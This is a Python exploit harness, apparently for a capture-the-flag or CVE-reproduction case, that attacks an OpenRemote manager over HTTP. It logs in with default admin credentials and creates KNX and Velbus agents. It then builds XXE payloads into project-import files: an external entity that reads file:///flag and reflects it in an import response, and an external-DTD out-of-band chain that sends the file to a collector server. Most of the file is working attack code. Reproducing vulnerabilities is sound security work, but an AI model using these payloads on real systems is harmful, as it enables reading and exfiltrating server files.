#!/usr/bin/env python3
"""Shared harness for the openremote-cve-2026-54640 case.

Drives the REAL OpenRemote manager over external HTTP only:
  - keycloak password-grant auth (via the manager /auth reverse proxy),
  - agent creation (POST /api/master/asset),
  - protocol asset import (POST /api/master/agent/assetImport/{agentId}).

The two XXE payloads are built by injecting a DOCTYPE into the BENIGN sample
ETS / Velbus project fixtures shipped in the OpenRemote test suite (fetched from
the pinned public repo at 1.24.1 -- they carry no flag themselves).

Stdlib only.
"""
import json, base64, zipfile, io, re, os, urllib.request, urllib.parse, urllib.error

RAW = "https://raw.githubusercontent.com/openremote/openremote/1.24.1"
VELBUS_URL = RAW + "/test/src/test/resources/org/openremote/test/protocol/velbus/VelbusProject.vlp"
KNXPROJ_URL = RAW + "/test/src/test/resources/org/openremote/test/protocol/knx/knx-import-testproject.knxproj"

_CACHE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".fixtures")


def _fetch(url):
    os.makedirs(_CACHE, exist_ok=True)
    dst = os.path.join(_CACHE, os.path.basename(urllib.parse.urlparse(url).path))
    if not os.path.exists(dst) or os.path.getsize(dst) == 0:
        with urllib.request.urlopen(url, timeout=120) as r:
            open(dst, "wb").write(r.read())
    return open(dst, "rb").read()


# ---------------------------------------------------------------- auth / api
def get_token(base, user="admin", pw="secret"):
    data = ("grant_type=password&client_id=openremote&username=%s&password=%s" % (user, pw)).encode()
    req = urllib.request.Request(
        base + "/auth/realms/master/protocol/openid-connect/token",
        data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
    return json.load(urllib.request.urlopen(req, timeout=60))["access_token"]


def _post_asset(base, token, body):
    req = urllib.request.Request(
        base + "/api/master/asset", data=json.dumps(body).encode(), method="POST",
        headers={"Authorization": "Bearer " + token, "Content-Type": "application/json"})
    return json.load(urllib.request.urlopen(req, timeout=60))["id"]


def create_knx_agent(base, token, host="10.255.255.1"):
    """KNX agent. host need not be reachable: the KNX connection catches connect
    failures and reconnects, so the protocol instance still registers and the
    import path becomes reachable."""
    body = {"name": "KNX import agent", "type": "KNXAgent", "realm": "master", "attributes": {
        "host": {"name": "host", "type": "text", "value": host},
        "port": {"name": "port", "type": "positiveInteger", "value": 3671},
        "routingMode": {"name": "routingMode", "type": "boolean", "value": False},
        "NATMode": {"name": "NATMode", "type": "boolean", "value": False},
        "messageSourceAddress": {"name": "messageSourceAddress", "type": "kNXMessageSourceAddress", "value": "0.0.0"},
        "agentDisabled": {"name": "agentDisabled", "type": "boolean", "value": False},
        "agentStatus": {"name": "agentStatus", "type": "connectionStatus", "value": "DISCONNECTED"},
        "notes": {"name": "notes", "type": "text", "value": "pcb"},
        "location": {"name": "location", "type": "GEO_JSONPoint", "value": {"type": "Point", "coordinates": [0, 0]}},
    }}
    return _post_asset(base, token, body)


def create_velbus_agent(base, token, host="collector", port=8000):
    """Velbus TCP agent. Unlike KNX, the Velbus TCP protocol throws on connect
    failure, so host:port MUST point at a listening TCP endpoint (the collector)
    for the protocol instance to register. timeInjectionInterval must be > 0
    (a 0 period makes scheduleWithFixedDelay throw and the agent never starts)."""
    body = {"name": "Velbus import agent", "type": "VelbusTCPAgent", "realm": "master", "attributes": {
        "host": {"name": "host", "type": "text", "value": host},
        "port": {"name": "port", "type": "positiveInteger", "value": port},
        "timeInjectionInterval": {"name": "timeInjectionInterval", "type": "positiveInteger", "value": 3600},
        "agentDisabled": {"name": "agentDisabled", "type": "boolean", "value": False},
        "agentStatus": {"name": "agentStatus", "type": "connectionStatus", "value": "DISCONNECTED"},
        "notes": {"name": "notes", "type": "text", "value": "pcb"},
        "location": {"name": "location", "type": "GEO_JSONPoint", "value": {"type": "Point", "coordinates": [0, 0]}},
    }}
    return _post_asset(base, token, body)


def do_import(base, token, agent_id, file_bytes, name="p"):
    """POST /api/master/agent/assetImport/{agentId}. Returns (http_status, assets_list)."""
    body = json.dumps({"name": name, "contents": base64.b64encode(file_bytes).decode(), "binary": True}).encode()
    req = urllib.request.Request(
        base + "/api/master/agent/assetImport/" + agent_id, data=body, method="POST",
        headers={"Authorization": "Bearer " + token, "Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req, timeout=180)
        return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


# --------------------------------------------------------------- payloads
def build_velbus_payload(flag_uri="file:///flag"):
    """ORIGINAL vector (CVE-2026-40882): external general entity reflected via a
    Velbus <Caption> (element text -> device name in the import HTTP response)."""
    s = _fetch(VELBUS_URL).decode("utf-8-sig")
    doctype = '<!DOCTYPE Project [ <!ENTITY xxe SYSTEM "%s"> ]>\n' % flag_uri
    s = doctype + s
    s, n = re.subn(r"<Caption>VMB7IN</Caption>", "<Caption>PCBFLAG:&xxe;</Caption>", s, count=1)
    assert n == 1, "Velbus Caption anchor not found"
    return s.encode("utf-8")


def build_knx_oob_payload(dtd_url):
    """RESIDUAL vector (CVE-2026-54640): the KNX ETS 0.xml references an external
    DTD; the Saxon transform of 0.xml resolves it and the OOB parameter-entity
    chain exfiltrates file:///flag to the collector. (In-band reflection is
    impossible here: ETS values live in attributes, where external entity refs
    are forbidden, and the import swallows parse errors.)"""
    raw = _fetch(KNXPROJ_URL)
    with zipfile.ZipFile(io.BytesIO(raw)) as z:
        xml = z.read("P-039A/0.xml").decode("utf-8-sig")
    m = re.match(r"^(<\?xml[^>]*\?>)", xml)
    assert m, "no xml decl in 0.xml"
    xml = m.group(1) + ('\n<!DOCTYPE KNX SYSTEM "%s">' % dtd_url) + xml[m.end():]
    out = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(raw)) as zin, zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            if item.filename == "P-039A/0.xml":
                data = xml.encode("utf-8")
            zout.writestr(item, data)
    return out.getvalue()


# --------------------------------------------------------------- collector
def collector_reset(collector_base):
    try:
        urllib.request.urlopen(collector_base + "/reset", timeout=30).read()
    except Exception:
        pass


def collector_hits(collector_base):
    try:
        return urllib.request.urlopen(collector_base + "/hits", timeout=30).read().decode(errors="replace")
    except Exception:
        return ""
